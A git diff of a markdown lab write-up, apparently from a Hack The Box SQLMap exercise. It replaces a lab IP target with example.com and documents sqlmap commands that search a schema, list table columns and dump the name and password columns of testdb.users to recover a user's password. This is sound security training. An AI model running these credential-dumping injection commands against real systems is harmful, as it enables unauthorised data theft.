@@ -1,25 +1,109 @@
-### 📅 21/06/2026 - Advanced Database Enumeration with SQLMap
+# SQLMap – Advanced Database Enumeration
 
-**Objective:** Exploited an SQL injection vulnerability (Case #1) to enumerate specific database structures and extract user credentials using advanced SQLMap features.
+## Objective
 
-**Key Concepts Learned:**
-* **Targeted Searching:** Using `--search` with database identifiers (`-D`, `-T`, `-C`) to find specific patterns inside massive database schemas without wasting time or terminal space.
-* **Data Extraction & Filtering:** Combining specialized flags (`-D`, `-T`, `-C`, `--dump`) to selectively extract target data rows rather than dumping full tables, optimizing bandwidth and speed.
+Practice advanced SQL injection enumeration techniques with SQLMap and retrieve specific information from a vulnerable database.
 
 ---
 
-### 💻 Lab Walkthrough & Commands Used
+## Case #1 – Finding a Column Containing "style"
 
-#### Task 1: Locating a Specific Column ("style")
-Initially running a broad `--schema` dump produced excessive noise, making it inefficient to audit manually. To bypass this, I utilized SQLMap's search capabilities to look for columns matching the keyword `style`.
+### Goal
+
+Identify the name of the column containing the word **"style"**.
+
+### Initial Approach
+
+I first attempted to enumerate the whole database schema:
 
 ```bash
-sqlmap -u "[http://154.57.164.70:30903/case1.php?id=1](http://154.57.164.70:30903/case1.php?id=1)" --search -C style --batch
+sqlmap -u "http://www.example.com/?id=1" --schema
 ```
-#### Task 2: Extracting Target User Credentials (User: "Kimberly")
-After identifying the layout structure, the next objective was to pull the password for the user "Kimberly". Because broad dumps produce too much noise, I used a structured, step-by-step approach to pinpoint the exact credentials.
 
-1. **Mapping the Table Structure:**
-   Knowing that HTB exercises frequently use a database named `testdb` and a table named `users`, I needed to discover the exact column names first. I ran a targeted command to list the columns inside that specific table:
-   ```bash
-   sqlmap -u "[http://154.57.164.70:30903/case1.php?id=1](http://154.57.164.70:30903/case1.php?id=1)" -D testdb -T users --columns --batch
+Although this provided all databases, tables, and columns, the amount of information made it difficult to manually locate the desired column.
+
+### Optimized Approach
+
+Instead of searching manually, I used SQLMap's search feature to look for columns containing the keyword `style`:
+
+```bash
+sqlmap -u "http://www.example.com/?id=1" --search -C style --batch
+```
+
+### Result
+
+SQLMap returned the column:
+
+```
+PARAMETER_STYLE
+```
+
+This solved the first challenge efficiently without having to inspect the entire schema manually.
+
+---
+
+## Case #1 – Retrieving Kimberly's Password
+
+### Goal
+
+Find the password associated with the user **Kimberly**.
+
+### Step 1 – Identify the Database and Table
+
+Since HTB labs commonly use the `testdb` database and a `users` table, I started by enumerating the table columns:
+
+```bash
+sqlmap -u "http://www.example.com/?id=1" -D testdb -T users --columns --batch
+```
+
+This revealed the relevant columns:
+
+* `name`
+* `password`
+
+### Step 2 – Dump Only the Required Data
+
+To avoid unnecessary output, I dumped only the `name` and `password` columns:
+
+```bash
+sqlmap -u "http://www.example.com/?id=1" -D testdb -T users --dump -C name,password --batch
+```
+
+### Result
+
+The output contained the credentials of all users, allowing me to identify Kimberly's password.
+
+---
+
+## Key Takeaways
+
+* `--schema` provides a complete overview of the database structure, but can generate excessive output.
+* `--search` is useful for quickly locating databases, tables, or columns based on keywords.
+* `--columns` allows targeted enumeration of table structures.
+* `--dump -C` makes data extraction more efficient by retrieving only specific columns.
+* Limiting enumeration to the necessary information reduces noise and speeds up the process.
+
+## Commands Used
+
+```bash
+# Enumerate schema
+sqlmap -u "http://www.example.com/?id=1" --schema
+
+# Search for columns containing "style"
+sqlmap -u "http://www.example.com/?id=1" --search -C style --batch
+
+# Enumerate columns in users table
+sqlmap -u "http://www.example.com/?id=1" -D testdb -T users --columns --batch
+
+# Dump only name and password columns
+sqlmap -u "http://www.example.com/?id=1" -D testdb -T users --dump -C name,password --batch
+```
+
+## Skills Practiced
+
+* SQL Injection Enumeration
+* Database Schema Discovery
+* Targeted Data Extraction
+* SQLMap Automation
+* Information Gathering
+* Efficient Enumeration Techniques
